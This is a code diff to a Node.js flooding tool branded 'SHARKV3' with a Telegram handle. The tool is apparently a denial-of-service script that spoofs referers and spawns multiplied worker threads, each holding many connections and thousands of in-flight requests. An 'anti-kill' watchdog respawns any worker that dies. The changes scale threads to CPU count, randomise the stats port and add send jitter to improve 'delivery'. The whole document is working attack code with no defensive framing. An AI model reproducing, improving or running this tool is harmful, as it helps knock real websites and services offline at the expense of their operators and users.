@@ -15,12 +15,15 @@ const referers = [
     'https://www.reddit.com/',
 ];
 
-const THREADS = 32;
+const CPU_COUNT = cpus().length;
+const THREADS = CPU_COUNT * 2;
 const INITIAL_CONNECTIONS = 45;
 const POWER_MULTIPLIER = 4;
 const MAX_INFLIGHT = 4000;
 const LIVE_REFRESH_RATE = 1100;
-const WARMUP_TIME = 10000; // 10 seconds
+const WARMUP_TIME = 10000;
+
+const DYNAMIC_PORT = Math.floor(Math.random() * 1000) + 9000;
 
 let totalRequests = 0;
 let successCount = 0;
@@ -41,16 +44,16 @@ if (isMainThread) {
 
     console.clear();
     console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
-    console.log(`SHARKV3! - WARMUP IN PROGRESS...`);
+    console.log(`PORT: ${DYNAMIC_PORT} | CPUx${CPU_COUNT} Threads`);
+    console.log(`WARMUP IN PROGRESS...`);
 
     const workers = [];
 
-    // Anti-kill watchdog
     function spawnWorker(data) {
         const w = new Worker(__filename, { workerData: data });
         w.on('exit', code => {
             if (Date.now() < endTime) {
-                console.log(`[ANTI-KILL] Restarting dead worker...`);
+                console.log(`[ANTI-KILL] Worker died. Respawning...`);
                 spawnWorker(data);
             }
         });
@@ -59,15 +62,14 @@ if (isMainThread) {
 
     setTimeout(() => {
         console.clear();
-        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
-        console.log(`WARMUP COMPLETE. FULL THROTTLE.`);
+        console.log(`SHARKV3 - FULL THROTTLE | PORT ${DYNAMIC_PORT}`);
 
         for (let i = 0; i < THREADS; i++) {
-            spawnWorker({ target, duration, initial: true });
+            spawnWorker({ target, duration, initial: true, port: DYNAMIC_PORT });
         }
 
         for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-            spawnWorker({ target, duration, initial: false });
+            spawnWorker({ target, duration, initial: false, port: DYNAMIC_PORT });
         }
     }, WARMUP_TIME);
 
@@ -99,12 +101,12 @@ if (isMainThread) {
             else if (msg === 'vanish') vanishedCount++;
         });
     });
-    server.listen(9999);
+    server.listen(DYNAMIC_PORT);
 } else {
-    const { target, duration, initial } = workerData;
+    const { target, duration, initial, port } = workerData;
     const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
     const end = Date.now() + duration * 1000;
-    const socket = net.connect(9999, '127.0.0.1');
+    const socket = net.connect(port, '127.0.0.1');
     const sendStat = msg => socket.write(msg);
 
     function sendLoop(client, inflight) {
@@ -148,7 +150,7 @@ if (isMainThread) {
             }
         }
 
-        setTimeout(() => sendLoop(client, inflight), 0);
+        setTimeout(() => sendLoop(client, inflight), Math.random() * 5); // tiny jitter helps delivery
     }
 
     function createConnection() {
